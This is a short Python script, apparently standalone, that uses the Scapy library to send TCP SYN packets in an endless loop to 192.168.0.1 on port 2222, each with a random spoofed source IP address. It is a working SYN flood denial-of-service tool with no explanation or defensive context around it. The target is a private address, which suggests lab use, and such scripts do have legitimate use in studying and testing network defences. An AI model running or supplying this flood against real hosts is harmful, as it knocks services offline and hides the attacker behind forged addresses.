from scapy.all import RandIP, IP, TCP, send

while True:
    pack = IP(src=RandIP(), dst='192.168.0.1') / TCP(
            sport=5555, dport=2222,
            seq=1505066, flags='S')
    send(pack)